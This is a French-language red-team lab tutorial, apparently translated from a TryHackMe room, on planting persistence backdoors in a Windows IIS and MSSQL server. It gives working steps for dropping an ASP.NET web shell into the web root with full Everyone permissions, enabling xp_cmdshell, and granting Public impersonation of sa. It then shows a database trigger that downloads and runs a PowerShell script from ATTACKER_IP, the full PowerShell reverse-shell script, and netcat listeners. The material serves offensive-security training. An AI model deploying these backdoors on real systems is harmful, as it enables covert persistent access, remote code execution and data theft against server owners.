Si vous ne souhaitez pas utiliser les fonctionnalités de Windows pour masquer une porte dérobée, vous pouvez toujours profiter de n'importe quel service existant pouvant être utilisé pour exécuter du code à votre place. Cette tâche examinera comment installer des portes dérobées dans une configuration de serveur Web typique. Néanmoins, toute autre application dans laquelle vous avez un certain degré de contrôle sur ce qui est exécuté devrait être également accessible par porte dérobée. Les possibilités sont infinies!

Utiliser des shells Web

La manière habituelle d'obtenir la persistance sur un serveur Web consiste à télécharger un shell Web dans le répertoire Web. Ceci est trivial et nous accordera un accès avec les privilèges de l'utilisateur configuré dans IIS, qui est par défaut `iis apppool\defaultapppool`. Même s'il s'agit d'un utilisateur non privilégié, il dispose d'un `SeImpersonatePrivilege`, offrant un moyen simple de remonter jusqu'à l'administrateur à l'aide de divers exploits connus. Pour plus d'informations sur la manière d'abuser de ce privilège, consultez la [salle Windows Privesc](https://tryhackme.com/room/windowsprivesc20) .

Commençons par télécharger un shell Web ASP.NET. Un shell Web prêt à l'emploi est fourni  [ici](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx) , mais n'hésitez pas à utiliser celui que vous préférez. Transférez-le sur la machine victime et déplacez-le dans la racine Web, qui se trouve par défaut dans le `C:\inetpub\wwwroot`répertoire :

Invite de commande

```
C:\> move shell.aspx C:\inetpub\wwwroot\
```

Remarque : selon la manière dont vous créez/transférez  `shell.aspx`, les autorisations du fichier peuvent ne pas permettre au serveur Web d'y accéder. Si vous obtenez une erreur Autorisation refusée lors de l'accès à l'URL du shell, accordez simplement à tout le monde toutes les autorisations sur le fichier pour qu'il fonctionne. Vous pouvez le faire avec `icacls shell.aspx /grant Everyone:F`.

On peut ensuite exécuter des commandes depuis le serveur web en pointant vers l'URL suivante :

`http://10.10.92.8/shell.aspx`

![d9845057ebf54a61401ca61c2c268fe8](https://github.com/dsgsec/Red-Team/assets/82456829/2d2effc3-fba7-4f53-90a3-78a4d41fe314)

Bien que les shells Web fournissent un moyen simple de laisser une porte dérobée sur un système, il est habituel que les équipes bleues vérifient l'intégrité des fichiers dans les répertoires Web. Toute modification apportée à un fichier déclenchera probablement une alerte.

Utiliser MSSQL comme porte dérobée

Il existe plusieurs façons d'implanter des portes dérobées dans les installations MSSQL Server. Pour l'instant, nous allons examiner l'un d'entre eux qui abuse des déclencheurs. En termes simples, les déclencheurs dans MSSQL vous permettent de lier des actions à effectuer lorsque des événements spécifiques se produisent dans la base de données. Ces événements peuvent aller de la connexion d'un utilisateur jusqu'à l'insertion, la mise à jour ou la suppression de données d'une table donnée. Pour cette tâche, nous allons créer un déclencheur pour tout INSERT dans la `HRDB`base de données.

Avant de créer le déclencheur, nous devons d'abord reconfigurer quelques éléments sur la base de données. Tout d'abord, nous devons activer la `xp_cmdshell`procédure stockée. `xp_cmdshell`est une procédure stockée fournie par défaut dans toute installation MSSQL et vous permet d'exécuter des commandes directement dans la console du système, mais elle est désactivée par défaut.

Pour l'activer, ouvrons , disponible depuis le menu Démarrer. Lorsqu'une authentification vous est demandée, utilisez simplement l'authentification Windows (la valeur par défaut) et vous serez connecté avec les informations d'identification de votre utilisateur Windows actuel. Par défaut, le compte administrateur local aura accès à toutes les bases de données.`Microsoft SQL Server Management Studio 18`

Une fois connecté, cliquez sur le bouton Nouvelle requête pour ouvrir l'éditeur de requête :

![eb3aaca1ed1da7d1e08f0c3069a5633a](https://github.com/dsgsec/Red-Team/assets/82456829/0ac9622b-54a6-4895-a9f4-1340c194ff21)

Exécutez les phrases SQL suivantes pour activer les « Options avancées » dans la configuration MSSQL, puis procédez à l'activation`xp_cmdshell` .

```
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

Après cela, nous devons nous assurer que tout site Web accédant à la base de données peut fonctionner `xp_cmdshell`. Par défaut, seuls les utilisateurs de base de données disposant de ce `sysadmin`rôle pourront le faire. Puisqu'il est prévu que les applications Web utilisent un utilisateur de base de données restreint, nous pouvons accorder des privilèges à tous les utilisateurs pour usurper l'identité de l' `sa`utilisateur, qui est l'administrateur de base de données par défaut :

```
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

Après tout cela, nous configurons enfin un déclencheur. On commence par passer à la `HRDB`base de données :

```
USE HRDB

```

Notre déclencheur exploitera `xp_cmdshell`l'exécution de Powershell pour télécharger et exécuter un `.ps1`fichier à partir d'un serveur Web contrôlé par l'attaquant. Le déclencheur sera configuré pour s'exécuter chaque fois qu'un message  `INSERT`est créé dans la `Employees`table de la `HRDB`base de données :

```
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';

```

Maintenant que la porte dérobée est configurée, créons `evilscript.ps1`dans la machine de notre attaquant, qui contiendra un reverse shell Powershell :

```
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

Nous devrons ouvrir deux terminaux pour gérer les connexions impliquées dans cet exploit :

-   Le déclencheur effectuera la première connexion pour télécharger et exécuter `evilscript.ps1`. Notre déclencheur utilise le port 8000 pour cela.
-   La deuxième connexion sera un shell inversé sur le port 4454 vers notre machine attaquante.

|

Boîte d'attaque

```
user@AttackBox$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

 |   |

Boîte d'attaque

```
user@AttackBox$ nc -lvp 4454
Listening on 0.0.0.0 4454

```

 |

Une fois tout cela prêt, naviguons vers `http://10.10.92.8/`et insérons un employé dans l'application Web. Puisque l'application Web enverra une instruction INSERT à la base de données, notre TRIGGER nous donnera accès à la console du système.
